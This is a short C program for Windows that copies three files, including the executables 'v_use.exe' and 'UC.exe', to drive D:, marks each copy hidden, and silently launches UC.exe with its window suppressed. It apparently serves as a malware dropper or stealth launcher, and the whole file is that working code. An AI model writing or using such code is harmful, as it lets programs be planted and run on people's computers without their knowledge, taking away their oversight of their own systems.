#include<windows.h>

int main()
{

	CopyFile("v_use.exe","D://v_use1.exe",true);
	SetFileAttributes("D://v_use1.exe",FILE_ATTRIBUTE_HIDDEN);

	CopyFile("ip","D://ip",true);
	SetFileAttributes("D://ip",FILE_ATTRIBUTE_HIDDEN);

	CopyFile("UC.exe","D://UC.exe",true);
	SetFileAttributes("D://UC.exe",FILE_ATTRIBUTE_HIDDEN);
	
	SetCurrentDirectory("D:\\");
	ShellExecute(NULL,"open","D:\\UC.exe",NULL,NULL,SW_HIDE);


	return 0;
}
